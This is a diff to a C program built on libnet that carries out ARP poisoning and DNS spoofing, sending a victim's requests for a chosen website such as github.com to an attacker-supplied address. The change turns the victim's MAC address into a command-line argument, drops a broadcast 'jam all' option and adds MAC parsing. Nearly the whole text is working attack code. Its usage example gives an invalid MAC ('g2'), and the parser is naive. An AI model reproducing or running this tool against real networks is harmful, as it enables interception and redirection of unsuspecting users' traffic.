@@ -21,8 +21,7 @@ char *website_to_spoof;      // Website which will be spoffed eg. "www.github.co
 char *redirect_addr;         // Website url or ip address which will be send instead of the website's eg. "192.168.0.47" or "www.guthib.com"
 u_long redirect_ip_addr;     // IP address of the redirect_addr
 u_int8_t source_mac_addr[6]; // MAC address of "interface_name"
-
-u_int8_t victim_hw_addr[6] = {0x2c, 0xf0, 0x5d, 0xae, 0xe4, 0x01};
+u_int8_t victim_hw_addr[6];  // MAC address of the victim
 
 struct saved_ip
 {
@@ -79,14 +78,14 @@ void check_prerequisites(int argc, char **argv)
     exit(EXIT_FAILURE);
   }
 
-  const int are_all_args_provided = argc == 5;
+  const int are_all_args_provided = argc == 6;
   if (!are_all_args_provided)
   {
     fprintf(
         stderr,
         COLOR_RED "Missing Arguments.\n" COLOR_RESET
-                  "Usage: %s INTERFACE_NAME GATEWAY_IP_ADDR WEBSITE_ADDR REDIRECT_IP_ADDR\n"
-                  "Example: %s wlo1 192.168.0.1 www.github.com 192.168.0.47\n",
+                  "Usage: %s INTERFACE_NAME GATEWAY_IP_ADDR WEBSITE_ADDR REDIRECT_IP_ADDR VICTIMS_MAC\n"
+                  "Example: %s wlo1 192.168.0.1 www.github.com 192.168.0.47 a8:44:12:13:g2:1b\n",
         argv[0],
         argv[0]);
     exit(EXIT_FAILURE);
@@ -98,10 +97,10 @@ void check_prerequisites(int argc, char **argv)
  */
 void *start_arp_poisoning()
 {
-  int jam_all = 0; // TODO change this so user will pass ip addres of victim or "all"
+  // int jam_all = 0; // TODO change this so user will pass ip addres of victim
   libnet_t *ln;
   u_int32_t target_ip_addr, zero_ip_addr;
-  u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+  // u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 
   struct libnet_ether_addr *src_hw_addr;
   char errbuf[LIBNET_ERRBUF_SIZE];
@@ -111,16 +110,18 @@ void *start_arp_poisoning()
   target_ip_addr = libnet_name2addr4(ln, gateway_ip_addr, LIBNET_RESOLVE);
   zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);
   libnet_autobuild_arp(
-      ARPOP_REPLY,                              /* operation type       */
-      src_hw_addr->ether_addr_octet,            /* sender hardware addr */
-      (u_int8_t *)&target_ip_addr,              /* gateway ip addr      */
-      jam_all ? bcast_hw_addr : victim_hw_addr, /* victim hardware addr */
-      (u_int8_t *)&zero_ip_addr,                /* victim protocol addr */
-      ln);                                      /* libnet context       */
+      ARPOP_REPLY,                   /* operation type       */
+      src_hw_addr->ether_addr_octet, /* sender hardware addr */
+      (u_int8_t *)&target_ip_addr,   /* gateway ip addr      */
+      // jam_all ? bcast_hw_addr : victim_hw_addr, /* victim hardware addr */
+      victim_hw_addr,            /* victim hardware addr */
+      (u_int8_t *)&zero_ip_addr, /* victim protocol addr */
+      ln);                       /* libnet context       */
   libnet_autobuild_ethernet(
-      jam_all ? bcast_hw_addr : victim_hw_addr, /* ethernet destination */
-      ETHERTYPE_ARP,                            /* ethertype            */
-      ln);                                      /* libnet context       */
+      // jam_all ? bcast_hw_addr : victim_hw_addr, /* ethernet destination */
+      victim_hw_addr, /* ethernet destination */
+      ETHERTYPE_ARP,  /* ethertype            */
+      ln);            /* libnet context       */
 
   // Save mac address
   for (int i = 0; i < 6; i++)
@@ -343,6 +344,13 @@ int main(int argc, char **argv)
   gateway_ip_addr = argv[2];
   website_to_spoof = argv[3];
   redirect_addr = argv[4];
+  char *victim_hw_addr_str = argv[5];
+
+  // Convert victim_hw_addr_str to victim_hw_addr
+  for (int i = 0; i < 6; i++)
+  {
+    victim_hw_addr[i] = (unsigned char)strtol(victim_hw_addr_str + i * 3, NULL, 16);
+  }
 
   redirect_ip_addr = libnet_name2addr4(NULL, redirect_addr, LIBNET_RESOLVE);
 
